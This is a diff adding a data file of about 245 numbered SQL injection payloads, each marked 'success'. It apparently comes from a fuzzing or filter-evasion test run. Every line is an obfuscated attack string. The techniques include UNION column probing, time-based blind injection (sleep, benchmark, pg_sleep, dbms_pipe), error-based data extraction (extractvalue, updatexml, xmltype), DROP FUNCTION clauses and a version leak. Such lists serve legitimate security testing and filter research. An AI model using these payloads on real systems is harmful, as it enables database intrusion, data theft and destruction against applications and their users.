@@ -1,0 +1,245 @@
+7 success "0x1' whEre/*1Mh_*/8864  =\x0b 8864 "
+8 success "0x1%' union/**/all\tSElect/*}ib*/null,null,null#/*/0x1*/.ps+"
+11 success '0x1"   )    )    aS xwrq wHEre\x0c\'w\'<>\'wq\' or 0x0 '
+13 success "1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  0x4c4b40,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  ' "
+15 success "1%' && 2006  =/*n}Q*/ 2006 "
+24 success '-2378" where\n\'L370#\'<>\'L370#C\' or 6872  =  0x1ad8-- jV'
+27 success 'iif  (  1878  =  2513,1,0x1/0  )   '
+28 success "0x1'   ) \x0b  )    union all sELeCt/*#yYCN*/null,null,null,null,null,null# "
+32 success "1'   )    )     )/**/  and 3202/**/ =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg\n"
+33 success "1%'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  ( \trandomblob  (  0x1dcd6500/2   )    )      )    )   -- "
+36 success '1" wHere 9889  =  (SeLecT 9889)\n'
+47 success "1,  (  sElect   (  cASE When   (  'DJ=' LIkE 'DJ='  )   ThEn 1 eLSe cast  (  1 As int  )  /  (  seLECt 0 FROm dual  )   end  )  \nFrOm dual  )   "
+49 success 'SeLeCt   (  cASE WHen   (  8993 \x0c=  8846  )   ThEn 0x2321 ElsE 8993*  (  SElECt 8993 fROm mysql.db  )   End  )  # H'
+58 success '0x1   )\t   )/*dRG\x0b*/   AS xzcl WhEre 2332\t  lIKE  \x0b2332 OR False '
+60 success '1   )    )     )   && elt  (  4249  =  4249 OR 0,7259  )   and    (    (     (  0x13a6  =  5030 '
+65 success "-8397'   )    )     )/**/  oR 2171  =  0x12b4 "
+72 success "seLecT/*')*/"
+82 success "1'+  (\n SELecT iutk WheRe/*P]N*/6158   LIke /**/ 6158 "
+87 success '0x1" \x0b )    )    union all SeLECt null,null,null,null,null,null,null,null,null-- '
+89 success "1  ) \x0c WhERe 4992   LikE   0x1380 or '*Yv'='*Yv3' "
+91 success 'If  (  3593   lIKe   3779  )   sEleCt 3593 ElSE dRoP function qtqy-- T{'
+95 success "-4699  )   as mymz whERe '#'='#' or elt  (  8808<>8809,3623  )  -- "
+97 success '-9356 or\x0belt  (/**/ 1032  =/**/ 1032 anD True,3623  )  -- izgi '
+101 success '1 WHeRe 6302 liKe/**/6302 '
+102 success "(sElEcT 1)' WHEre 4253   likE/**/\x0c 4253 "
+111 success "0x1'   )    )\x0c   as xqvq whERE 4816  =  4816 Or False oR False || 4240  =    (  SeleCt 4240 fRoM pg_sleep  (  5  \n)    )  /*7|*/-- "
+112 success '0x1"/**/order by/*XGPx*/1# '
+114 success "0x1' wHeRe\t5230   lIKe \x0c 5230 "
+116 success "1%'  )/**/  Or 8514   LIKE  \tbenchmark  (  5000000,md5 \x0b(  0x544d5a4c   )/**/ \x0b )   # "
+119 success '-0x15b8"   )    )    Or 0x1c7c \n=  6184# '
+131 success 'SeLeCT LikE  (  \'abcdefg\',upper  ( \thex  (  randomblob  (  0x1dcd6500/2   )    )      )    )    &&    (    (   "nxvp"   like   "nxvp '
+139 success '0x1"  ) \n/**/as rcnk wHeRE 8796!=0x225d '
+142 success "1' in boolean mode  )   oR 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103 /*T\x0c*/)  ,5  )  # "
+149 success "0x1'+  (  sELEct mkbv wHere 1648  =  0x670/**/ANd 9254   like /**/   (  seLeCT count /**/( /*p} ,L*/*  )   FROM rdb$fields/*Wx#`*/AS t1,rdb$types\nAS t2,rdb$collations as t3,rdb$functions aS t4\t )  -- "
+151 success '1 aND 3754  =    (  SElECT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeLeCt   (  CAsE WheN   (  3754  =  3754  ) \t tHEn 1 eLsE 0 EnD  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FrOM dual  )  -- xwoo '
+154 success '1" wHErE 0x1ec7 /**/ LIkE   7879 '
+162 success "or 'n'<>'n;'/*Wo(q{*/AND/**/'D'<>'Dt'/*\t"
+163 success "-9370'/**/ )   wHerE 7070  =/*;hv*/ 7070 Or make_set  (  9354  =  9354,0x1c11  )  -- "
+168 success '1"\x0bwHeRE \'Z\'=\'Z\' '
+171 success "  ||  userid\x0bLiKe/**/'% "
+173 success 'selEcT benchmark  (  5000000,md5  (  0x4c4d6142   )\t   )    ANd/**/  (  "%"  =  " '
+181 success "1  )   oR elt  (  6272  =  6272,sleep  ( /**/0x5   )    )    aND   (  8600  =  8600 oR 'bIrYA'<>'bIrYA' "
+183 success 'SelEcT case wHEN (sElecT 0x15b7)/**/ =\x0b 3483\ntheN 1 eLSe null eNd-- '
+186 success 'SeleCT sleep  (  0x5  )   And    (    (     (  "lczw"   liKe   "lczw '
+190 success '0x1  \n)    )  '
+196 success "0x1'\tunion all SelECt null,null,null,null,null,null,null,null# 4H"
+197 success "1'  ) \t AS yyyb whErE 'J'='J' And   (  8770  =  6988  )  *6988--\n$N"
+198 success '1" procedure analyse  (  extractvalue  (  0x2427,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and "onsd"/**/like "onsd '
+208 success "(SelecT 1)' In boolean mode  )/**/  anD/**/sleep  (  5  )  # "
+210 success '(seLeCT 1)"   )    )    and elt  (  1210  =  1210,sleep  (  0x5   )    )    and    (    (   "afby"  =  "afby '
+211 success ' end and "%"   like   " '
+212 success "1'+  (  SElecT yjyp whERe 9696\x0c  LIKE   9696 "
+226 success "1' in boolean mode/**/ )   && 5725   like   5552# "
+228 success "1'\twherE 4945\n =  4945 "
+232 success "0x1'  ) /*dd8M*/ union/**/all sElecT/**/null,null,null,null,null,null-- 0x9WN"
+233 success '1   )    )     )   And 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    AnD    (    (     (  6556  =  6556 '
+235 success "-(SeLecT 5327)'   )/**/   )     )   oR 1606   liKe   6099 "
+237 success '1/**/union\nall SelEcT null,null,null,null,null,null,null,null# '
+242 success 'sElECt pg_sleep  (  5  )\x0c  aNd "%"  =  " '
+248 success '-2276"   )    )    aS qwow wHErE 2321  = \x0b2321 oR \'m,\'<>\'m,\' Or 0xdce  =/**/ 0xb9b-- E2'
+258 success '0x1" \n)   AS jqli WhERe 0x1e71  /**/lIKE   0x1e71 '
+264 success "0x1' iN boolean mode  )  /**/rlike   (  SElECT/*M)L*/* fROm   (  sELect  (  sleep  (  0x5   )    )     )  sgvo  )  # "
+267 success '0x1   ) \t  )    union all SElecT null,null,null,null-- p5'
+284 success "-1084 WHERe 1181  =  1181 OR make_set  (  9354  =\x0b 9354 || '#Q'!='#Q',7185  )  -- "
+300 success "0x1'  )  \noR sleep  (  (SelecT 0x5)  )/**/ "
+314 success '-8639/**/ ) \n/**/or 8138  =  6252 '
+316 success " (  SElEcT   (  cASe WhEn   (  6035   lIkE\x0c  0x269a  )   thEN 6035 elsE 6035*  (/*`#'@*/ Select 6035 FrOM mysql.db  )   enD   )  \n )  "
+318 success "0x1'+  (  SeLect gqez wHere 3704  =  0xe78 ANd\n'::'='::' "
+321 success '1  )\x0b  WhERE 0x15fd   LikE   5629 '
+322 success 'iF  ( /**/0xd40\x0b  Like   4422  )   sELECt 3392 ELSe DroP function xsqq-- '
+323 success '1%" And 0x1fd4  =  Like  (\x0b \'abcdefg\',upper  (  hex  (  randomblob  (  0x1dcd6500/2   )    )      )    )   -- '
+330 success '1%"  ) \n\t&& \'BUJ1\'!=\'BUJ1e\'\x0bOR 0-- '
+332 success "-9393' whERe 3119  =  3119 anD 1 oR 95=95--/*\\7tM*/"
+336 success '1 oR 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm '
+346 success '1%" anD 2805  =  1345 '
+351 success "1' iN boolean mode/**/ )   && 3824  =  benchmark  (  5000000,md5  (  0x76555642   )\n   )   # 2G"
+352 success '%27  OR  1  /**/liKe   1 '
+365 success "-5386'  )   union\x0ball SelecT 8026,(sELecT 8026),(selECt 8026),8026,8026,0x1f5a# "
+371 success '0x1   )  \n )     )   union all sELEct null,null,null,null,null,null,null,null,null,null-- @'
+374 success '-0x19c7%"   )    )  \x0c or make_set  (  \'I\r\'!=\'I\r-\',0x1c11  )   and    (    (   "%"  =  " '
+384 success "0x1  )   AS lisg\twHeRE 'Y+4:v' lIkE 'Y+4:v' "
+386 success "1   )    )    aS rvex/**/whERE 3462   liKE   3462 anD 4595  =/**/ 4595 Or 'd^Fv\x0b'!='d^Fv\x0b'# "
+388 success '-4494 || 5291\x0c =  4452 '
+390 success "0x1%'/**/union all sElECT null,null,null,null,null,null,null,null,null,null# c"
+399 success "sElEcT\ncount  (  *  )   FRom\x0cgenerate_series  ( /**/1,5000000 /**/)   &&    (    (\x0c/**/  /**/(  'ldqq'   LikE\n  'ldqq "
+402 success '1  ) \n whERe 8671  =  8671 && make_set  (  4931  =  1642,0x66a  )  -- '
+405 success '1"   )/**/ /*\'O$W*/ )    union all SElecT null,null,null,null,null#\x0b'
+406 success "1'+  (  SEleCT dgnt WHerE 4701  =  4701 oR 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  0x57  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  -- "
+407 success '1" anD 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELEct   (  CASE wHEn   (  7756  =  7756  )   THEN 1 ElsE 0 END  )   FRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )   Or chr  (  122  )  ||chr  (  113   )    )  \n  )   '
+415 success 'SElECt   (  CasE whEn   (  0xfdd  =  0x574  )   Then 0xfdd eLSe 1/  (  SElect 0/**/ )   ENd \n)  -- '
+422 success "1   )    )    as llnm where 0x196e  =  6510 AND True and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob /*ehu*/(  0x1dcd6500/0x2   )    )      )    )  \x0c-- Md"
+423 success 'iif  (  8354 \x0b=\x0c/**/(SeLect 0xdbb),1,0x1/0\n )   '
+433 success '-2448%"  ) \n Or 3038  =  3038 '
+434 success "sELeCT/*pY'*/CASE When 0x24ae   LIKE   5752\x0bTHeN 1 elSE null\tend--\x0b"
+435 success '1" anD elt\t (  (sELect 4594)  =/**/ 1040,0x410  )\n  '
+445 success '0x1"   )    )     )   union all SeLecT null,null,null,null,null,null,null,null,null--/*C,*/'
+446 success "-0x655'\tin boolean/**/mode/**/ ) \n order by 1--/**/"
+447 success '1"  ) /*96W*/ aS pobe wHErE 1704  =  1704 '
+457 success '1"  )/**/ \nas ebvt wHere 5305   liKe  /**/5305 '
+458 success "0x1%'  ) /*\rCi(*/\nunion\x0ball SElecT null# "
+460 success "-6368' union/*(o#*/all SelEct\t6529,0x1981,(sELect\t6529)--/**/E"
+471 success '0x1%" \n )    )    union/**/all sEleCt null,null,null,null,null,null,null,null# de v'
+472 success '1"   )    ) \n  aS rrms wHere 8185  =  0x1ff9 union all SelECt null,null,null,null,null,null,null,null-- i?tn'
+478 success '-4191 /**/)\n  order by 1#/**/'
+479 success '1" \x0c)   AS/**/nyzd WherE 5305   lIkE   5305 '
+487 success "0x1%'  )/**/  AND elt  (  0xc2a  =  3114 aND True,sleep  (  (SelecT 0x5)   )    )  \t# Z]"
+488 success '1" wHeRE 6200  =/**/ 6200 anD True aNd elt  (  1210  =  1210,sleep  (  5   )    )   -- Kz'
+497 success "1 WhERe (seLECt 7158)   liKE   7158 Or elt  (  'N'!='N0',sleep  (  5 \x0c )    )   # "
+501 success '0x1   )    )\x0b   aS shmg WHerE 1371   LIkE   1371 union all\tsElEct null,null,null,null,null,null,null,null,null,null#\tbM'
+503 success '-8633" oR 5099   likE  \t5974 '
+509 success '1 union\x0ball sElEcT\x0cnull,null,null,null,null,null,null,null,null# g@'
+513 success '-2211" oR 2113  =  0x22b5# '
+514 success "1'+  ( /**/select hett/*B*/where\x0b7228  =  7228 "
+523 success "1'  )   wHERe 3262  = \t3262 union all\x0csEleCt null,null,null,null,null,null,null,null,null,null# K"
+524 success '-0x2035"/*\x0cN*/ \n)    )    Or 3038  =  3038 '
+527 success " (  sElECT * fROM  /**/(  seLECt  (  sleep  (  0x5   )\n   )     )  srmq\t )   aNd  /**/ (    (   'cbaj'  =  'cbaj "
+528 success '1%"   ) /**/  )    union all Select null,null,null,null,null,null,null,null,null,null-- UV'
+541 success '1  )\n  WhEre 2223   liKE   (SElEct 2223) oR False '
+558 success "0x1'  ) \n\torder by 1#\t"
+559 success "1'  )   AS hlbq wHere 2347  =  2347 ANd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )   OR chr  (\t 113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeleCT   (  cASE wHeN/**/  (  6055  =  6055  )   tHEN 1 eLSe 0 ENd  )   frOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- "
+566 success '1" WhErE 0x1ad9=0x1ad9 anD True '
+570 success 'SeleCt   (  cAsE When   (  3539   lIke \n 8768  )   tHEN 3539 Else cast /*5*/(  0x1 as int  )  /  (  SeLEct 0 froM dual  )   EnD  )   froM dual-- '
+574 success "-4775'  )/**/  or 3038  =  3038 "
+575 success 'If  (  4735  =  8907  )   seLECt 4735 eLse dROp function qigo-- l\r'
+580 success '0x1" union/**/all/**/seleCt\tnull,null,null,null,null,null,null#/**/Vh'
+582 success '(sEleCt 1)"   )/**/   )    AS hace wHERE 8785  =  8785 or False\n'
+600 success "seLeCt count  (  *  )  /**/fRoM generate_series  (  1,0x4c4b40  )/*:,&!*/  AND  \n (    (     (  'xori' LikE 'xori "
+605 success ' (  7098/**/ =  7098  and  sleep  (  5   )    )  '
+606 success "1'  )   WhERe 5680  =\x0b 5680 aNd   (  3020  =  3020  ) /**/*(SeLect 6703)-- "
+612 success 'seLEct dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  ( \x0c101  )  ,5/**/ )   FroM dual And \t (  "layz"  =  "layz '
+616 success '0x1 union/*0tliy*/all SEleCT null,null,null,null,null,null# '
+639 success "1'+  (  SelECt mrdi wHErE 0x1d1b  = \x0b7451 && 8594   LIKe     (  SeLECT 8594 fROm pg_sleep  (  5   )    ) /**//*}*/-- "
+640 success "0x1%'\x0b  )  /**/ )     )   union all SeLecT null,null,null,null,null,null,null,null,null,null-- XQ)"
+646 success 'iF  (  8284  =  6171  )   SELECt 8284 elSE DRop function mbih-- '
+649 success '-0x1edd  )/**/  order by/**/0x1-- '
+653 success '-9644   )    )    OR 4144  =    (  sEleCt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SelecT   (  CASE wheN   (  4144  =  4144 and True  )   THEn 1 ELSE 0 enD  )   FROm dual  )  ||chr  (  113  )  ||chr  (  0x7a  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fRoM dual  )   AND    (    (   \'|\'<>\'|"\' '
+654 success '1" wheRE (sElect 4845) liKE\x0b(SelEct 4845)/**yV`*/'
+655 success "SElECt likE  (  'abcdefg',upper  (  hex  ( \x0brandomblob  (  500000000/(sELEct 0x2)   )/*i*/   ) /*B*/   \n)    )    "
+656 success '1"   )    )    or 7427   LIKE   dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  ( /**/109  )  ,5  ) \t-- f'
+665 success "1 /**/)   aS odqn wHERE\t'0'='0x0' "
+680 success "SelecT dbms_pipe.receive_message /**/(  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fRoM dual  )  ||' "
+682 success '1   )    )    aND extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SELECt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    And    (    (   3626   likE   3626 '
+684 success '1"  )   As ffon WHERe 2738  =  2738 ANd 3754  =    (  SElEct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  0x71  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELect   (  cAse WheN   (  3754  =  3754 Or False  )   tHEN 1 eLSe 0 enD  )   fROM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )/**/ ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fRoM dual  )  -- 3('
+687 success '-5798" or 5023  =  ctxsys.drithsx.sn  (  5023, /**/(  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElEcT   (  CASE WHen   (  \'3db\'=\'3db\' anD True  )   thEN 1 ElsE 0 EnD  )   From dual\n )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   '
+690 success '-3420 WherE\x0c9681  =  9681 Or False || make_set  (  2438  =  1977,1977  )  -- '
+702 success '-9434"  )   as cqlw/*uA+*/WHeRE \'w\'=\'w\' || 2733 \x0c=  1047-- \r'
+703 success "0x1%'   )  \t )     )   union\nall SELect null,null,null,null# 5ylx"
+705 success 'SElEcT pg_sleep  (  0x5  )\n  ANd    (    (   "qani"   like   "qani '
+706 success "1'  )   as ohcs WheRe 9588  =  9588 or elt  (  0x1880  =  6272,sleep  (  5   )    )\t  -- "
+708 success '1"  )   WHerE \'K\'<>\'K6\' aND\nTrue '
+709 success '-9432   )    )    AS/**/nqya/**/WHEre 8387  =  8387 or elt  (  0x241a  =  6180,(SelecT 6180)  ) \n-- '
+713 success "-0x1f23   )    )    aS armw/*e j+*/WhERE '0A'='0A' OR make_set  (  'D'<>'D*',7185  )  -- "
+726 success "0x1'\twhere 'd'<>'d9' "
+729 success "-8186%' or elt  (  1032/*`\x0b|i,*//**/=  0x408,3623  )   and\t'%'  =  ' "
+739 success '-8043%"   )    )     )  \tor make_set  (  \'dxy]\'<>\'dxy];\',0x1c11  )   and    (    (     (  "%"  =  " '
+741 success '1 WHeRE 5443/*kxtc_*/\x0b=  0x1543 '
+748 success "1'  )   WHEre 2407!=2408 anD 1 aND 3754  =    (  SELeCt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElecT   (  CaSe wHEn   (  9143 in (9142,9143,9144)  )   THEN 1/**/ELsE 0 End  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )\x0c  fROM dual  )  -- "
+749 success '1 /**/)/**/  whEre 9344  =  9344\nAnd 0x267b<>9852 '
+754 success "-2120'  ) /**/ or 0x221e  =  8844# \x0bb"
+758 success '\\x27UNION/*(h*/seleCt '
+768 success "1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    ) /*r\rA [*/  and    (    (   'cwjd'  =  'cwjd "
+770 success '1"   )    )    union\x0call SelecT null,null,null,null,null,null,null# '
+772 success "0x1%'  )  /**/and 0x1fd4  =  like  (  'abcdefg',upper  (  hex  (  randomblob  ( \t0x1dcd6500/2   )   \x0b)\n     )    )   -- "
+777 success "1  ) /*/*//*|-!S*/WHeRe '_l'<>'_lx' "
+780 success 'If/**/ (  1928  =  0x12cb  )\x0b  Select 0x788 elSe DrOp function ucko-- |p[A'
+789 success 'iif  (\t 7011 /*J *\t*/=  2522,1,1/0  )   '
+793 success "1%'   )    )    and 3824  =/**/ benchmark  (  5000000,md5  (  0x76555642   )    )\n   and  \x0b (    (   '%'  =  ' "
+798 success "-2223'   )\n   )   /**/As mjwp WheRE 8650   like   8650 or 7900  =  5838 "
+802 success '1 WhEre 2301 \n=  2301 '
+804 success 'sELeCt lIkE  (  \'abcdefg\',upper  (  hex  (  randomblob  (  0x1dcd6500/2   )    )      )    )    aNd "ejmj" LikE "ejmj '
+808 success "0x1  )/**/  AND make_set  (  'J'!='Jx' && 9603!=9604,8899  )  \x0b"
+810 success "0x1' wHerE 1593\x0c =  0x639 "
+817 success "1' In boolean\tmode  ) /**//*GpE1*/union all SeleCT null,null,null,null,null-- "
+819 success '1%"  )   union all SELeCt null,null,null,null,null,null,null,null,null,null--/**/'
+827 success '0x1"  )   aS tnux WhERe 4888  =  0x1318 rlike   (  SelECt * fROM   (  sELECT  (  sleep  (  5   )    ) \x0c   )  vwyq  )  # '
+833 success '1"   )    )    union/**/all SELecT null,null,null,null,null,null# \rG/|kl'
+834 success '1" where 2619  =/**/ 2619 && 2823  =  5100# l'
+839 success '0x1   )    )     )   OR/*Y\r0*/sleep /**/(  5  )  # '
+848 success "-2912'/*e.M*/  )/**/   )    order by\t1-- !|"
+850 success "1'  )   aNd elt  (  4249  =  4249 aND True aNd 4762<>4763,7259  )/**/  "
+852 success 'SElecT count  (  *  )   FROm rdb$fields\nAs t1,rdb$types/*>;*/as t2,rdb$collations as t3,rdb$functions AS t4 &&    (    (     (  "dskh"  =\x0b "dskh '
+853 success ' (/*JtT\\*/ case when 8422  =  0x2104 then 0x1 else null end  )  '
+858 success 'iif\x0c (  4638  =/*E/*/ 8258,1,1/0  )  /**/'
+859 success "1%' or 0x2112  =  benchmark  (  0x4c4b40,md5  (  0x694a4745   )    )    and\x0c'%'  =  ' "
+863 success ' sELEct\x0b* FROm/**/users WhErE id   lIKe   1\x0b*\\. union sELEct/*#@9h*/null,@@VERSION -- 1\t$X='
+864 success '(SElEct 1)%"  )/**/  union all SelECt null,null,null,null,null,null,null,null,null-- '
+884 success "1' IN boolean mode  )   && 2388   lIke   benchmark  (  5000000,md5  (  0x6d457153   )    )   # "
+885 success "iif \t( /**/0x1489  =  0x1489 Or 's'='s*',1,1/0 /**/)   "
+890 success '-7395%" order by\x0c(SeleCt 1)--/**/'
+900 success '-9265"  )   or 7834  =/**/ 1685 '
+901 success "0x1'+  (  select\n'xqjx' WhERe 0x1b88  =  0x1b88 aNd 9198  =  9198 OR '1:'<>'1:'-- "
+904 success '1  )   As tgqd WheRe 6369  =  6369 && 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SELEct   (  cASe whEN   (  6055  =  6055  )   THeN 1 ELse 0 END  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  0x7a  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- '
+905 success "-8028%'   )    )     )/**/  oR 5042  =  5214 "
+914 success 'selECt caSe/**/WHen 7634   lIkE   (SElECT (SElecT 3954)) theN/*1*/1 ElSE null ENd-- '
+921 success '0x1  )   whERE 0x1b72  =/**/ 0x1b72 aND\x0c0x1 '
+926 success '1   )    )    aS sfan wHeRe 7176 \t=  7176 and 7017   lIKE   7358 '
+931 success '1"   )    )    AS knyf wHErE \'$\' LiKE \'$\' oR 0x20c0   LiKe   like  (  \'abcdefg\',upper  (  hex  (  randomblob  (  0x1dcd6500/0x2   )    )      )    )   -- '
+938 success '0x1  )/*t>d*/  wHeRE 1487/**/ =  1487 aND 1 ANd 1 '
+939 success '0x1" \n ) /**/ \x0b)    aS sgln whEre 0x1d95  =\x0c 7573 '
+941 success 'SeLECT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67/**/ )  ||chr  (  79  )  ||chr  (  (SelecT 101)  )  ,5  )\n \x0bfRom dual &&    (    (   "gydr" liKE "gydr '
+946 success "-0x178e%'  ) /**/ or\x0b3038 \x0c=/**/\x0b0xbde "
+949 success '-0x17bc"/**/  )    )    or 8277  =/**/ 4757 '
+966 success "a'\x0c--/**/"
+976 success "1'  )   as/*2QT*?*/dpmh WHeRe 5281  = /**/5281 And 0x7d6  =  2006 "
+983 success '-9864"  )   or elt  (  5885  =  0x1348,4936  )/**/  and   (  "bfbb"\tlike "bfbb '
+984 success 'make_set \x0c(  5679/*`[|*/  like   9769,9769 \x0b)/**/  '
+987 success '0x1"/**/union all/*B7*/select/**/null,null,null,null,null,null,null,null,null,null#\t'
+989 success '0x1" and 3824 \n=  benchmark  (  0x4c4b40,md5  (  0x76555642   )    )    and "tqbi"  =  "tqbi '
+995 success "1'  )  /**/WherE 1115   liKE \x0b 1115\n"
+1000 success '1 wHerE 8398  =/**/ 8398 '
+1006 success '0x1"  )\x0c  WheRe 1833  =  0x729 '
+1009 success '"  )   Or benchmark\x0b (  0x989680,MD5  ( \t1   )    )   # &f'
+1010 success "1'||  (  select 'epjr' fRoM dual whERE 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat \x0b(  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1 \n)  # "
+1012 success 'if  (  8995   liKE   9787  )   sElEct 8995 elsE DRop function ofgg-- '
+1014 success '0x1" Or 0x2112  =  benchmark/*MA~[g*/ (  5000000,md5  (  0x694a4745   )    )    '
+1018 success "-(SeLecT 0x669)'/*cb03=*/union\x0ball SelECT (SelECt 0x12e3)# "
+1020 success "1  )   as ekgx WhERe 9923  =  9923 || 8384  =  liKE  ( \t'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )  \t-- "
+1022 success 'elt  (  2567  =  9921,(SelecT 9921)  )   '
+1031 success "sELECt pg_sleep  (  0x5  )  \x0b AND  '%'   like   ' "
+1034 success "1'   )    )    AS xrre wheRe 1172  =  1172 anD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SeLecT   (  elt  (  0xd41  =/**/ 3393,1   )    )     )/**/ ,0x717a767a71  )  ,1161  )  -- +h"
+1040 success "1   )    )     )   || 6979  =  LIke  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/2   )    )      )    )   -- >"
+1048 success 'seLeCT count  (  *  )\n  fROM rdb$fields as t1,rdb$types As t2,rdb$collations/**/as t3,rdb$functions AS t4 aNd    (    (   6977  =  0x1b41 OR 894<>0x37e '
+1051 success '-0x253f"\tOrder/**/By 0x1--/*T8*/'
+1057 success '(sElEct 0x1)%"   )    )     )  /**/union all SelecT\nnull,null,null,null,null,null,null# '
+1067 success '-5322"\tunion\tall SeLEcT 6494,0x195e,0x195e,(seleCt 6494),6494,0x195e--/**/@!'
+1068 success '1"\tWHeRE 8387   like   8387 '
+1073 success "-1587' /**/)  \n|| 0x2093  =  5540/*!l,*/"
+1074 success "0x1'  )   aS\nbzem WheRe 0x1cfa=7418  OR  False anD True "
+1078 success '1\t )   whERe 4780  =  0x12ac '
+1081 success "-4032'  )   WHeRe 5157 \n=  5157 OR 1809  = /**/2810# "
+1093 success '1%"   )\x0b   )    order/**/by 1# X\x0c\\'
+1094 success "^'\n"
+1099 success "0x1%'\nor 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  ' "
+1101 success '-0x1d2a wHeRe 0x1429  =  5161 && (SELEct 1) OR 3038  =  3038 '
+1102 success '1" anD elt  ( /**/1210   lIke   1210,sleep  (\n 5   )    )    '
+1104 success "-0x184a'   )  \t )    or/**/2236   like   0x1175# "
+1107 success '0x1  )   as cinw WhERe 3732  =  3732 && 8594  =/**/   (  SELEcT 8594 FRom pg_sleep  (  5   )    )   -- '
+1114 success '1"  )   anD 2388   like   benchmark  (  5000000,md5  (  0x6d457153   )    )   # '
+1117 success '-5963"/**/or 4640<>4641# '
+1120 success '-6263%"   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113/**/ )  ||  ( \tselect   (  case when   (  5852!=5853  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   "%"  =  " '
+1124 success 'selEcT CAsE wHEN 2930  =  7964\x0btHEN 1\nElSE/**/null end-- U'
+1126 success 'selEcT   (\n cASe wheN   (  0x166c   LiKe   7636  )   ThEn 5740 elSe\x0bcast  (  1 as int  )  /  (  SElEct 0 FrOm dual  )   end  )   frOm dual-- r'
+1127 success "1%' \n)   union all SeLEct null,null,null,null,null,null,null,null,null# "
+1129 success "-9657'  )/**/  aS ziiq whERE 7725  =  7725 OR 3038   LIKE   3038/**/"
+1133 success '0x1" \x0c)   WHeRe\n5358  =/**/ 5358 '
